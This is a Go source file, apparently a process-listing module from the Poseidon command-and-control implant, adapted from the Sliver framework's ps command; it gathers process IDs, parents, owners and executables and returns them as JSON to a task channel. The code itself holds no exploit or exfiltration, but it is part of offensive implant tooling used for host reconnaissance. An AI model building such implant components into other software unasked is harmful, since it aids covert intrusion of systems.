package ps

import (
	"encoding/json"

	"github.com/xorrior/poseidon/pkg/utils/structs"
)

// Taken directly from Sliver's PS command. License file included in the folder

//Process - platform agnostic Process interface
type Process interface {
	// Pid is the process ID for this process.
	Pid() int

	// PPid is the parent process ID for this process.
	PPid() int

	// Executable name running this process. This is not a path to the
	// executable.
	Executable() string

	// Owner is the account name of the process owner.
	Owner() string
}

//ProcessArray - struct that will hold all of the Process results
type ProcessArray struct {
	Results []ProcessDetails `json:"Processes"`
}

type ProcessDetails struct {
	ProcessID       int    `json:"process_id"`
	ParentProcessID int    `json:"parent_process_id"`
	Path            string `json:"path"`
	User            string `json:"user"`
}

//Run - interface method that retrieves a process list
func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
	procs, err := processes()
	tMsg := structs.ThreadMsg{}
	tMsg.Error = false
	tMsg.TaskItem = task
	if err != nil {
		tMsg.Error = true
		tMsg.TaskResult = []byte(err.Error())
		threadChannel <- tMsg
		return
	}

	p := make([]ProcessDetails, len(procs))

	// Loop over the process results and add them to the json object array
	for index := 0; index < len(procs); index++ {
		p[index].ProcessID = procs[index].Pid()
		p[index].ParentProcessID = procs[index].PPid()
		p[index].User = procs[index].Owner()
		p[index].Path = procs[index].Executable()
	}

	var pa ProcessArray
	pa.Results = p
	jsonProcs, er := json.MarshalIndent(p, "", "	")

	if er != nil {
		tMsg.Error = true
		tMsg.TaskResult = []byte(er.Error())
		threadChannel <- tMsg
		return
	}

	tMsg.TaskResult = jsonProcs
	threadChannel <- tMsg
}
